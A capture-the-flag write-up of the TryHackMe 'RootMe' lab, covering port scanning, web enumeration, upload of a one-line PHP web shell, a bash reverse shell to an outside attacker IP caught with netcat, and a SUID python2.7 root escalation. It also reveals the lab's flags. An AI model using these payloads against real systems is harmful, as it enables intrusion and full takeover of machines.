# TryHackMe - RootMe

## Information

- **Platform:** TryHackMe
- **Machine:** RootMe
- **Target IP:** `10.66.188.74`
- **OS:** Linux / Ubuntu
- **Difficulty:** Easy

> ⚠️ Educational write-up for a controlled TryHackMe lab environment.

---

## 1. Reconnaissance

### Port scan

First, I performed a TCP SYN scan against all ports:

```bash
nmap -sS -p- -n -Pn --open --min-rate 3500 10.66.188.74 -oG allports
```

Open ports identified:

| Port | Service |
|---|---|
| 22/tcp | SSH |
| 80/tcp | HTTP |

### Service enumeration

I then enumerated the detected services:

```bash
nmap -sCV -p22,80 -n -Pn 10.66.188.74 -oN Versiones
```

Relevant results:

- **SSH:** OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
- **HTTP:** Apache 2.4.41
- **HTTP title:** `HackIT - Home`

---

## 2. Web Enumeration

### WhatWeb

I identified the technologies exposed by the web server:

```bash
whatweb http://10.66.188.74
```

The web service was running Apache/PHP-related functionality.

### Directory enumeration

I used Gobuster to discover hidden directories:

```bash
gobuster dir -u http://10.66.188.74/ -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 100
```

Interesting paths included:

- `/uploads`
- `/css`
- `/js`
- `/panel`
- `/server-status` → HTTP 403

The most interesting endpoint was:

```
/panel
```

This exposed a file-upload functionality.

---

## 3. Exploitation - File Upload

The upload functionality allowed a PHP-related extension to be uploaded.

I created a simple PHP web shell:

```php
<?php system($_GET[0]); ?>
```

The purpose of this web shell was to execute commands supplied through the HTTP request.

After uploading the file, I used the exposed upload location to reach the uploaded script.

---

## 4. Reverse Shell

I prepared a reverse shell payload:

```bash
bash -c "bash -i >& /dev/tcp/192.168.138.23/1234 0>&1"
```

On my attacking machine, I started a Netcat listener:

```bash
nc -lvnp 1234
```

The target then connected back to the listener, providing a shell on the target system.

---

## 5. Post-Exploitation

Once the shell was obtained, I started local enumeration.

### Users with login shells

```bash
cat /etc/passwd | grep "sh$"
```

### Sudo permissions

I also checked whether the current user had sudo privileges:

```bash
sudo -l
```

---

## 6. User Flag

The user flag was located at:

```
/var/www/user.txt
```

<details>
<summary>Click to reveal flag</summary>

```
THM{y0u_g0t_a_sh3ll}
```

</details>

---

## 7. Privilege Escalation

I searched the filesystem for binaries with the SUID permission:

```bash
find / -perm -4000 2>/dev/null
```

Among the results was:

```
/usr/bin/python2.7
```

Because Python 2.7 had the SUID bit set, it could be abused to execute a shell with elevated privileges.

I used:

```bash
python2.7 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

The `-p` option preserves the effective UID, allowing the resulting shell to retain elevated privileges.

---

## 8. Root Flag

After obtaining the privileged shell, I accessed:

```
/root/root.txt
```

<details>
<summary>Click to reveal flag</summary>

```
THM{pr1v1l3g3_3sc4l4t10n}
```

</details>

---

## 9. Attack Chain

```
Nmap
  ↓
22/tcp + 80/tcp
  ↓
Web enumeration
  ↓
Gobuster
  ↓
/panel
  ↓
File upload
  ↓
PHP5 upload
  ↓
Command execution
  ↓
Reverse shell
  ↓
Local enumeration
  ↓
SUID enumeration
  ↓
/usr/bin/python2.7
  ↓
Privilege escalation
  ↓
Root
```

---

## 10. Lessons Learned

### Reconnaissance
- Scan all TCP ports instead of relying only on common ports.
- Follow an initial port scan with service/version enumeration.

### Web Enumeration
- Directory enumeration can reveal functionality that is not linked from the main page.
- File-upload functionality should be reviewed carefully for extension and content validation weaknesses.

### Post-Exploitation
- After obtaining a shell, enumerate users, sudo permissions, SUID binaries, and other local privilege-escalation vectors.
- SUID permissions on interpreters or other powerful binaries can create significant privilege-escalation opportunities.

### Methodology

The complete attack path was:

**Recon → Enumeration → Initial Access → Reverse Shell → Local Enumeration → Privilege Escalation → Root**

---

## Disclaimer

This write-up documents exploitation techniques performed against a controlled TryHackMe lab machine. The techniques should only be used on systems for which you have explicit authorization.
